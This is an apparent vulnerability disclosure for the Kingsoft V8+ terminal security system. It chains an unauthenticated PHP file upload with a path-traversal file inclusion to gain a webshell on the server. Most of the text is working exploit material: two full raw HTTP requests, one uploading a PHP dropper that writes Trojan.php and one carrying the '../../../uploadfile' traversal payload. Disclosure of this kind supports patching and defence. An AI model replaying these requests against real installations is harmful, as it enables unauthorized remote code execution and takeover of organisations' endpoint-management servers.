# Kingsoft Security Arbitrary File Upload + File Contains Vulnerabilities

#### 1.Vulnerability link

https://www.ejinshan.net/product_V8/index.html

#### 2.Vulnerability version

V8+ terminal security system

#### 3.Vulnerability reproduction

3.1. First upload the php file in /inter/uploadFile.php to the system, uploadFile.php does not require arbitrary permissions to upload the file

Upload the data package as follows:

```shell
POST /inter/uploadFile.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 315
Content-Type: multipart/form-data; boundary=f308c8c8074428d48dc1fbd26e7b3ed5


--f308c8c8074428d48dc1fbd26e7b3ed5
Content-Disposition: form-data; name="savepath"


111
--f308c8c8074428d48dc1fbd26e7b3ed5
Content-Disposition: form-data; name="file"; filename="123.php"


<?php
$test='<?php phpinfo(); ?>';
file_put_contents("Trojan.php", $test);
?>
--f308c8c8074428d48dc1fbd26e7b3ed5--
```

After the file is successfully uploaded, the echo packet contains the file name. for example:

![Image](C:%5CUsers%5CAdministrator%5CDesktop%5CKingsoft%20Security%20Arbitrary%20File%20Upload%20+%20File%20Contains%20Vulnerabiliti%5CKingsoft%20Security%20Arbitrary%20File%20Upload%20+%20File%20Contains%20Vulnerabilities%5CImage.png)

But the sad part is that the file cannot be accessed directly,final,I found that the file /inter/ajax.php has file inclusion loopholes, which can contain file upload loopholes. Upload files and write them into the webshell to achieve the effect of controlling the host.

Upload the data package as follows:

```shell
POST /inter/ajax.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 121
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=lootcn61f1sd5immqommrt9pv6
Connection: close


{"../../../uploadfile/111/123_127.0.0.1_1618316095_92846":{"name":"admin","password":"21232f297a57a5a743894a0e4a801fc3"}}
```

Finally visit /inter/Trojan.php, successfully access the write file address

eg：

![shell](C:%5CUsers%5CAdministrator%5CDesktop%5CKingsoft%20Security%20Arbitrary%20File%20Upload%20+%20File%20Contains%20Vulnerabiliti%5CKingsoft%20Security%20Arbitrary%20File%20Upload%20+%20File%20Contains%20Vulnerabilities%5Cshell.png)

